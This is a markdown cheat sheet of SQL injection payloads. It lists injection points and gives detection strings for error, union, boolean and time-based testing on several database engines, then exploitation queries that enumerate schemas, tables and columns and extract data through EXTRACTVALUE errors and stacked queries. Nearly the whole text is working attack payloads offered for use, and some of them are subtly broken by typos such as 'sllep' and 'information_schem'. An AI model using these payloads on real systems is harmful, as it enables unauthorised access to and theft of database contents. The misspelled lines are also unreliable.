# SQL Injection

### Types of SQL Injection

* In Band SQL Injection
* Blind SQL Injection
* OutOfBand Injection

### SQL Injection Points

- **`Login Form`**
- **`Url Search Parameters`**
- **`Url id values`**
- **`Cookie Values`**
- **`XML encoded values like <storeId>**</storeId>`**
- **`Form Input Sections`**
- **`File Upload Sections`**

### Detecting SQL Injection

*  Error Based

        '
        "
        ;
        ;--
        ;#
        `
        ')
        ")
        `)
        '))
        "))
        `))

* Union Based

      ' union select 1,2,3,4;-- -
      ' order by 1,2,3,4;-- -
      ' union select null,null,null,null;-- -
* Boolean Based

      ' and true;-- -
      ' and false;-- -
      ' and 1=1;-- -
      ' and 1=2; -- -
      ' or 1=1; -- -
      ' or 1+2 = 3;-- - 
      ' and 'a' is not 'b
      ' or '1' = '1
* Time Based

  * MySQL
    
        '; select sleep 10;-- -
        ' and sllep 10; -- -
        ' && sleep 10; -- -
        ' | sleep 10; -- -
  * PostgreSQL
    
        ' || pg_sleep(10);-- -
        '; select pg_sleep(10);-- -
  * Oracle
        
        1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
        1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
  * MSSQL

        ' waitfor_delay '0.0.10
  * SQLite

        1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
        1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))

### Exploitation

##### In-Band SQL Injection

- Union Based Attack
```sql
' UNION SELECT 1,2,3,4;-- -
```
```sql
' union select 1,2,group_concat(schema_name),4 from information_schema.tables;-- -
```
```sql
' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=<database_name>
```
```sql
' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name = <the_table_name>
```

- Error Based Attacks
```sql
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT version()), '~|~'));-- -
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT @@version), '~|~'));-- -
' AND EXTRACTVALUE(1337, CONCAT('~|~', (SELECT database()), '~|~'));--
```
- Stack Based Attack
```sql
'; select group_concat(schema_name) from information_schem.tables;-- -
```











































































































































































































































































































































































































































































































